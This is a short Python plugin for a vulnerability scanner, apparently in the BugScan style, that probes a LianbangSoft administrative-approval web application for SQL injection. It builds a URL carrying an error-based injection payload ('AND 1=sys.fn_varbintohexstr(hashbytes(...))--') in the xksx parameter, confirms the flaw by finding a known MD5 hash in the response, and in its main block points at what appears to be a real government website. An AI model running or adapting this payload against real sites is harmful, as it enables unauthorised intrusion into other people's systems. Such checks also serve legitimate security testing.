#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
author: Smeet
name: lianbangsoft_sp_xksx_sqli

'''
def assign(service, arg):
    if service == 'lianbangsoft':
        return True, arg
        
def audit(arg):
    data = "workplate/xzsp/gxxt/tjfx/dtl.aspx?id=76001&refnum=137&baseorg=209&flag=''&xksx=928+AND+1=sys.fn_varbintohexstr(hashbytes('MD5','1234'))-- "
    url = arg + data
    code, head, res, errcode, _ = curl.curl2(url)
    if code==500 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('lianbangsoft', 'http://www.hbsxxzfwzx.gov.cn/')[1])